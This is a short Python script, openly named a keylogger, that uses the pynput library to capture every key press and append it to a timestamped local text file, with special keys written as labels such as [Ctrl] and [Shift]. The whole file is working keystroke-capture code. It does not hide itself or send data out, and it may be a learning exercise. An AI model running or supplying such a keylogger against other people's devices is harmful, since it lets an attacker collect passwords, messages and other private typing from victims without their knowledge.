from pynput.keyboard import Listener

from datetime import datetime

timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
key_information = f"keylogger_{timestamp}.txt"

def write_on_file(key):
    log = str(key).replace("'", "")  # Sirf quotes hatao
    
    
    if "Key.space" in log:
        log = " "
    
    elif "Key.enter" in log:
        log = "\n"
    
    elif "Key" in log:

        if "ctrl" in log.lower():
            log = "[Ctrl]"
        elif "shift" in log.lower():
            log = "[Shift]"
        elif "alt" in log.lower():
            log = "[Alt]"
        elif "cmd" in log.lower() or "win" in log.lower():
            log = "[Win]"
        else:
            log = f"[{log.replace('Key.', '')}]"
    
    
    with open(key_information, "a") as f:
        f.write(log)

with Listener(on_press=write_on_file) as listener:
    try:
        listener.join()
    except KeyboardInterrupt:
        print("\n👋 Program is closing now...!") 